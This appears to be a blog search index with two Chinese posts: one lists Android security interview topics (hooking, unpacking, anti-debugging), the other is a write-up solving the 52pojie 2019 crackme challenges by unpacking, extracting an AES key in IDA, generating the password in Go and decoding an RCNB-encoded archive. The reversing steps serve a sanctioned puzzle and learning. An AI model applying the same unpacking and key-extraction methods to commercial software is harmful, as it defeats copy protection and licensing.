<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022秋招 安全工程师（安卓方向）面经</title>
    <url>/2021/12/01/2022-autumn-mobile-security-interview-experience/</url>
    <content><![CDATA[<h2 id="认清形势，放弃幻想"><a href="#认清形势，放弃幻想" class="headerlink" title="认清形势，放弃幻想"></a>认清形势，放弃幻想</h2><p>末流985本，计算机科学与技术专业，无国奖，无实习经历。<br>15年开始搞安卓逆向，目前技术一般。</p>
<p>8.16第一次投简历，8.18第一次面试，9.10第一个意向书，10.15第一个正式offer。</p>
<p>PS：没有实习经历还是比较吃亏的，建议大三下学期春招找个实习，然后秋招投提前批。</p>
<span id="more"></span>
<h2 id="面试及offer情况"><a href="#面试及offer情况" class="headerlink" title="面试及offer情况"></a>面试及offer情况</h2><p>阿里：安全工程师 <strong>（已offer）</strong><br>腾讯：安全技术-IEG-客户端安全 （GM面挂）<br>字节：客户端软件安全工程师-安全与风控 <strong>（已offer）</strong><br>美团：安全工程师 <strong>（已offer）</strong><br>拼多多：安全工程师 <strong>（已offer）</strong><br>网易互娱：逆向分析工程师 <strong>（已offer）</strong><br>猿辅导：Android逆向开发工程师 （被毁意向）<br>360：信息安全工程师-Android方向 （二面挂）</p>
<h2 id="一面、二面"><a href="#一面、二面" class="headerlink" title="一面、二面"></a>一面、二面</h2><p>自我介绍（重要）<br>项目经历（重要）<br>实习经历（重要）<br>项目最大的难点<br>网络协议逆向思路<br>有没有开发相关的项目<br>有没有大厂app逆向经验<br>有没有研究过iOS逆向<br>说几个安卓漏洞</p>
<h3 id="安卓相关（重要）"><a href="#安卓相关（重要）" class="headerlink" title="安卓相关（重要）"></a>安卓相关（重要）</h3><p>Frida、Xposed原理<br>inline hook、got hook、exception hook原理<br>ARM汇编：寄存器，调用约定（包括其他CPU架构），跳转指令<br>DEX结构、ELF结构、反编译过程<br>Java反射、静态代理和动态代理、类加载机制（双亲委派）<br>反调试和反反调试、ollvm（反混淆）<br>加固与脱壳（整体加固、指令抽取、指令转换/vmp、java2c）<br>Unicorn框架原理、VirtualApp框架原理<br>安卓虚拟机（Davilk和ART）、JIT和AOT<br>HTTPS证书校验（单向、双向校验）、中间人攻击<br>对常见算法的了解（编码、哈希、对称、非对称）<br>对设备指纹的了解、对安卓源码的了解<br>安卓系统安全机制（权限控制、签名校验）、so加载流程（linker）<br>安卓系统启动流程、Zygote启动流程、APP启动流程<br>Activity和Service的生命周期、Binder通信机制</p>
<h3 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h3><p>操作系统：进程和线程（安卓如何获取）、进程调度策略、进程的状态及转换、虚拟地址和物理地址<br>计网：OSI七层模型（协议举例）、TCP和UDP、DNS、HTTPS过程、Get和Post区别<br>C++：指针和引用、变量的区别（static、全局局部）、编译过程（哪个阶段处理include）、动态链接和静态链接、const char*, char const*, char* const的区别<br>Java：面向对象语言三大特征、多态的体现（与C++模板类的区别）、内部类和静态内部类、HashMap和ConcurrentHashMap、快速失败和安全失败、GC机制、多线程的实现方式、线程池、synchronized</p>
<h3 id="算法题"><a href="#算法题" class="headerlink" title="算法题"></a>算法题</h3><p>最小栈、计数排序、反转链表、螺旋矩阵、后缀表达式、最大正方形、旋转数组找最小值、两个栈实现队列、求根节点到叶节点数字之和</p>
<h2 id="三面、HR面"><a href="#三面、HR面" class="headerlink" title="三面、HR面"></a>三面、HR面</h2><p>自我介绍<br>职业规划<br>实习/项目相关<br>升学打算及原因<br>能不能提前实习<br>前几轮面试体验如何<br>对其他安全领域的了解<br>为什么选择逆向这一领域<br>最有技术深度的文章<br>遇到过的最大挑战<br>最有成就感的事<br>三个词形容自己的优/缺点<br>身边的人怎么评价你<br>家庭情况/感情生活<br>平时的兴趣爱好<br>最近看了什么书<br>其他公司投递情况及进度<br>对工作的要求（城市、岗位职责、薪资、时间等）</p>
<h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a href="http://blog.lc4t.me/2021/02/03/%E6%A0%A1%E6%8B%9B%E6%94%BB%E7%95%A5DLC/">校招攻略DLC</a><br><a href="https://coolshell.cn/articles/8790.html">程序算法与人生选择</a><br><a href="https://la0s.github.io/2019/05/13/chunzhao/">起落落落起的春招找实习之旅</a><br><a href="https://bbs.pediy.com/thread-257825.htm">收集了一些移动安全面试的问题 欢迎补充</a><br><a href="https://github.com/SecYouth/sec-jobs">SecYouth/sec-jobs</a><br><a href="https://github.com/cckenny/2020_autumn_mobile_security_interview">cckenny/2020_autumn_mobile_security_interview</a></p>
]]></content>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2019吾爱破解论坛春节红包四题Writeup</title>
    <url>/2019/02/19/52pojie-2019-red-packet/</url>
    <content><![CDATA[<p>解题方法并不唯一，仅供参考。</p>
<h2 id="题目打包下载地址"><a href="#题目打包下载地址" class="headerlink" title="题目打包下载地址"></a>题目打包下载地址</h2><p><a href="https://down.52pojie.cn/Challenge/Happy_New_Year_2019_Challenge.rar">https://down.52pojie.cn/Challenge/Happy_New_Year_2019_Challenge.rar</a></p>
<h2 id="第一题-签到题"><a href="#第一题-签到题" class="headerlink" title="第一题 签到题"></a>第一题 签到题</h2><p>关注“吾爱破解论坛”公众号，回复指定字符串即可获得本题正确口令和第二题题目下载地址。</p>
<h2 id="第二题-CrackMe"><a href="#第二题-CrackMe" class="headerlink" title="第二题 CrackMe"></a>第二题 CrackMe</h2><p>（本题我做的时候是无壳的，因为碰巧发现了内测时的题。公测时加了个upx的壳，故需要先脱壳，esp定律即可）<br>（这题用OD其实更方便些，个人习惯用IDA）<br>脱壳后IDA打开，<code>Shift+F12</code>查看字符串，找到关键字符串<code>正确!!!回复你输入的内容到吾爱破解论坛公众号</code><br>按X查看引用，定位到判断代码<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2019-1.png"><br>按F5查看伪代码<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2019-2.png"><br>上面有个长度判断，输入字符串长度为16<br>然后下面有个strcmp判断，相等则返回0，不过加了个<code>!</code>就变成相等返回真了</p>
<p>所以在strcmp下个断点查看寄存器(v2)即可得到密码<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2019-3.png"></p>
<span id="more"></span>
<h2 id="第三题-逆向题"><a href="#第三题-逆向题" class="headerlink" title="第三题 逆向题"></a>第三题 逆向题</h2><p>IDA打开，搜索<code>main</code>，找到程序主入口，定位到关键代码（前面还有个sha1算法的，应该和AES的key有关）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2019-4.png"><br>逻辑是base64解码，然后再用aes解密，跟<code>HappyNewYearFrom52PoJie.Cn</code>比对，相同则通过校验<br>而aes的key应该跟输入的uid有关，虽然不知道他怎么生成，但是可以在使用它的时候断下，直接提取<br>所以点开<code>main_AesDecrypt</code>，给NewCipher下断点（查看go语言源码可知，传入参数的是key）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2019-5.png"><br>在IDA中运行程序，输入uid，然后口令输入一个<code>base64Encode</code>过的字符串（比如<code>MQ==</code>），通过第一个解码校验<br>然后会在解码时断下，查看传入的第一个参数（其实是key的指针）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2019-6.png"><br>在Hex View中按G定位，输入<code>12858120</code>，找到对应的值，提取之（key是十六位的，所以提取前十六位即可）<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/52pojie-2019-7.png"><br>得到<code>EF2D8BFA0C30AB270B92CC73A563AFA3</code><br>其实这一串数据就是我的uid对应的sha1散列值(<code>ef2d8bfa0c30ab270b92cc73a563afa3b04faa75</code>)的字节数组形式，取前16位<br>AES加密方式为CBC（<code>main_AesDecrypt</code>函数中可以直接看出），补码方式为<code>PKCS5Padding</code>（AES解密错误时，会退出程序，但是有异常信息一闪而过，给报错函数下断点即可查看异常信息）<br>所以把<code>EF2D8BFA0C30AB270B92CC73A563AFA3</code>转化成字节数组，使用<code>AES/CBC/PKCS5Padding</code>方式，<br>加密<code>HappyNewYearFrom52PoJie.Cn</code>，再进行<code>base64Encode</code>就可以得到口令了<br>（至此，程序逻辑完全清晰了）</p>
<h3 id="go语言代码"><a href="#go语言代码" class="headerlink" title="go语言代码"></a>go语言代码</h3><p>之前为了验证golang生成的exe程序结构，从网上抄了个aes加解密的go语言的代码，改一改正好用的上（现学现用）</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/sha1&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line">    <span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5Padding</span><span class="params">(ciphertext []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">    padtext := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5UnPadding</span><span class="params">(origData []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    length := <span class="built_in">len</span>(origData)</span><br><span class="line">    unpadding := <span class="keyword">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    blockSize := block.BlockSize()</span><br><span class="line">    origData = PKCS5Padding(origData, blockSize)</span><br><span class="line">    blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">    crypted := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">    blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">    <span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    blockSize := block.BlockSize()</span><br><span class="line">    blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">    origData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">    blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">    origData = PKCS5UnPadding(origData)</span><br><span class="line">    <span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    uid := <span class="string">&quot;351649&quot;</span></span><br><span class="line">    h := sha1.New()</span><br><span class="line">    h.Write([]<span class="keyword">byte</span>(uid))</span><br><span class="line">    bs := h.Sum(<span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">var</span> aeskey = bs[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    pass := []<span class="keyword">byte</span>(<span class="string">&quot;HappyNewYearFrom52PoJie.Cn&quot;</span>)</span><br><span class="line">    xpass, err := AesEncrypt(pass, aeskey)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    pass64 := base64.StdEncoding.EncodeToString(xpass)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;加密后:%v\n&quot;</span>,pass64)</span><br><span class="line">    bytesPass, err := base64.StdEncoding.DecodeString(pass64)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    tpass, err := AesDecrypt(bytesPass, aeskey)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;解密后:%s\n&quot;</span>, tpass)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四题-RCNB"><a href="#第四题-RCNB" class="headerlink" title="第四题 RCNB"></a>第四题 RCNB</h2><p>解压得到<code>RCNB.md</code>，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ȐĆŅƃȓƇńƃȒċƝÞɌÇńßɌĉŇƅŕƇŃbȒȼȵßȒĆȵƁȓĉnƁɌćǸß</span><br><span class="line"></span><br><span class="line">ƦćƝƁȓĉnƅȓčƞÞɌćÑbȒČŃbȒċÑbŕƇŃþȒČNƃȒĈÑƄȓĊÑƄŕƇņÞȓčƞÞɌćÑbȒċƝÞŘcǸÞȐĆŅBƦĊȵþřÇȵƅȐċŇbɌcńþȓČŇƁŕƇNƀȒČŃBɌćÑBɌċnƄȓĈƝbŗƇƞÞŗčnBŕƇnþȒȻŃBȓĉnƅȒČNƅȒƈŇþŕčȠßŕƇŃƃřčȠbřċȵƀ</span><br><span class="line"></span><br><span class="line">ȐčNƄŕƇņƃɌcŅƄɌċnþŕƇŇƁȓƇńƁŕƇńþɌcńƄŕƇńþɌCňƀƦȻƝƃŕƇńþɌCňƀȐĉņþŗcŅƅȒĈÑƄȓĊǸƅȓĈȵþɌćƞßŕƇņÞȒȻŃþɌCňƀɌćǸbȒȼǹßȓĈƝB</span><br><span class="line"></span><br><span class="line">[ƦĉņƃŖċŅþŕƇŅƀȒCŅƀȒƈŇþɌcŅƄɌĉŇßŕƇņÞȓčƞÞȒƈňþŕƇńþȓĉnþȓČŇBŗcŅƅɌćƞƁȓćŅƁŕƇņÞȒȻŃþɌCňƁ](//rcnb.xyz)</span><br><span class="line"></span><br><span class="line">řĊÑbȒĉȠƀɌćÑbȒċƝÞȓćŅƁɌƈȠƃŕƇŃþȒȻŃþȒĈƞÞȑÇǹƄɌCȠƄƦȻŇƅɌćƞBȐčnÞŗÇÑBřĊÑbɌĆnþŗÇǹb</span><br><span class="line"></span><br><span class="line">ȐȼŃßɌćÑbŕƇņÞȒȻŃƄŕƇņÞɌcńþȒCŅbŕȻ</span><br><span class="line"></span><br><span class="line">ŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc</span><br></pre></td></tr></table></figure>

<p>有一个明显的网址<code>rcnb.xyz</code>，浏览器打开发现，所谓RC就是一个自定义的编码方式（因为开头有R结尾有C？），将内容解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Prove your Niubility</span><br><span class="line"></span><br><span class="line">Hello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.</span><br><span class="line"></span><br><span class="line">To prove you are as NB as RC, complete this trial!</span><br><span class="line"></span><br><span class="line">[It&#x27;s dangerous to go alone, take this!](//rcnb.xyz)</span><br><span class="line"></span><br><span class="line">And the key: Which_is_N0t_Th3_Answ3r</span><br><span class="line"></span><br><span class="line">With the trial:</span><br></pre></td></tr></table></figure>

<p>后面的解出来是个7z的文件，但是由于转化成了字符串，所以很多字节丢失了，解码出来变成了问号。所以需要修改js代码，让它返回16进制字符串，方便直接转化成文件</p>
<h3 id="修改js代码"><a href="#修改js代码" class="headerlink" title="修改js代码"></a>修改js代码</h3><p>定位到editor.js代码的rc2str函数，将它修改为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rc2str</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str === <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> res = rcnb.decode(str.trim())</span><br><span class="line">    <span class="keyword">return</span> Bytes2Str(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Bytes2Str函数是直接网上找的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Bytes2Str</span>(<span class="params">arr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;arr.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">var</span> tmp = arr[i].toString(<span class="number">16</span>);</span><br><span class="line">       <span class="keyword">if</span>(tmp.length == <span class="number">1</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">       &#125;</span><br><span class="line">       str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就可以得到一串16进制字符串，转化为文件保存即可。<br>压缩包的密码就是之前得到的<code>Which_is_N0t_Th3_Answ3r</code><br>得到一个nb文件，直接记事本打开，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ȐȼŃƁȓĉnƅŕƇŅƀȓƇŃƅȒċƝþŕƇNƄɌćŃÞɌCȵBȒČNƄɌCňƀɌćÑbȒCŅÞŕƇŇƁȓƇńƁŕƇŅƅȒCņbȒċƝÞȒƈƝƀȒČnƁɌćŃÞȓƈȠƅȓƇNþɌcńBȓĊǸƁȒȼȵbȒƈnbɌCȵßȒȼȠÞȓĉNƁŗćƝƅRćŇbƞƅRȻÑßŘȻŇƁrĊńßŕčȠþRĉNƁƦĈņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƅŔĆņÞrȼȒćƝþǸßRĊńþrȻNþrČńßŕčǸÞRĊȵÞrȼȵbŕƇŇÞrĊnÞŔĆnBŘÇƝƃrĉǹþƦćņƅƦcȵƀƦćņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƃŔĆǸþRĊƝƃrĉňÞƦĉřƇƞþȵƅrȼņbrCnƃŔĆņßRćńßrȻńßŕčŃBRĊƞƅřȻƞƀřƇǹþƦćȵÞřƈƞþřȻŅþƦcǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻņƁƦcǹþƦćņƄƦcƞƄřȻņBƦcǹÞƦćŃbƦĈȵƀƦćȒćƝÞŃƄŔCƞÞřȻŅþƦcňÞƦĉřƇƞþȵƅrȼņbrCŃƄŔCƞßřȻŅÞƦcǹÞƦćȵƄřƈȵƀƦćŅÞƦcňÞƦĉȵƁřƈŅßřƇȒćƝþŃBRĊƞßřȻņƀƦcňÞƦĉȵƄřƈƞÞřȻņƀƦcǹÞƦćNþƦĈƞƅřȻņƀƦcňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞƄřȻȒćƝÞnƃŔĆǸþRĊŇƅrĊŃBrČŃƃŔċńþrȻŅbrċǹÞƦćȵÞřƈȓčnÞnƅrćǸƃŔćÑþŘȻȠBŘĊȵƅŕċRćņßƝƃŔƇȵƅrƇŅÞƦcǹÞƦćȵƁřƈȓčnƄNþřĆŃƃŔċÑƀrÇƞƀřƇǹþƦćņƄƦcƞƅřȻņƁƦcňÞƦĉņƄƦcňßƦcņƀƦcǸßřȻȵƃřƈňßƦcŇBřƇǸƄřȻņƄƦcȵƀƦćȒćƝÞǸbŔćňÞRČNƅŘCǹÞƦćŃbƦĈňÞƦcƞƀřƇǸƄřȻȒĉŅBǹÞrčȠbrčŅÞŔcÑƃRCȵbŕƇnƅrćŃƄŔCƞßřȻŅÞƦcňÞƦĉȵƁřƈƞƄřȻŇbřƇňÞƦĉȵƁřƈŅßřƇŇBřƇǸƁřȻņƄƦcƞßřȻƞƀřƇǹþƦćȵÞřƈÑbřȻřČȵßǸÞRĊǸþRĊǹÞrčȠbrčǸbŔćņþRćȠƃŘĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƁř